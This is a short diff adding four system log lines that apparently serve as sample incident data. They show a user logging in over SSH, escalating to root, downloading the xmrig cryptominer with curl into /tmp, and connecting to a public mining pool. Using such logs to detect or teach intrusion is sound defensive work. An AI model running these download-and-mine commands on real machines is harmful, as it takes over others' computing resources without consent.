@@ -1,0 +1,4 @@
+Mar 14 12:35:12 RSCH-JUP-03 sshd[2221]: Accepted publickey for j.mercer from 203.0.113.99 port 55711 ssh2
+Mar 14 12:36:02 RSCH-JUP-03 sudo: j.mercer : TTY=pts/0 ; PWD=/home/j.mercer ; USER=root ; COMMAND=/bin/bash
+Mar 14 12:39:18 RSCH-JUP-03 bash[2299]: curl -L https://github.com/xmrig/xmrig/releases/download/v6.22/xmrig.tar.gz -o /tmp/x.tgz
+Mar 14 12:40:01 RSCH-JUP-03 xmrig[2311]: new job from pool.supportxmr.com:3333 diff 50000
